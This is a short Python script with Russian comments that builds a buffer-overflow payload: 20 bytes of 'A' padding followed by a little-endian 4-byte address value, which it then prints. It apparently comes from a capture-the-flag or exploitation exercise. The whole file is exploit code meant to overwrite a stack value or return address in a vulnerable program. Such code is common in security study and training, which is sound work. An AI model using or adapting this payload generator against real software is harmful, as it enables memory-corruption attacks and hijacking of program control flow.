# Функция для преобразования целого числа в байты (little-endian)
def int_to_bytes(number, length):
    return number.to_bytes(length, byteorder='little')

# Смещение и значение для добавления в пэйлоад
offset = 20
value = 4347715

# Создание пэйлоада
payload = b'A' * offset + int_to_bytes(value, 4)

# Вывод пэйлоада
print(payload)
